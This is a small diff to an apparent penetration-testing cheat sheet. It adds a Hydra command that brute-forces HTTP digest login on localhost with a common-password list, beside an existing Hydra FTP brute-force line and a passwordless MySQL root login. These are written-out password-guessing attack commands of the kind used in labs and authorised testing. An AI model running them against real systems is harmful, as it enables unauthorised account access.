@@ -21,6 +21,7 @@
 
 ## Hydra 
 - __```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  127.0.0.1 ftp```__
+- __```hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 127.0.0.1 http-get /digest/```
 
 ## Mysql
 - __```mysql -h 10.0.1.22 -u root```__
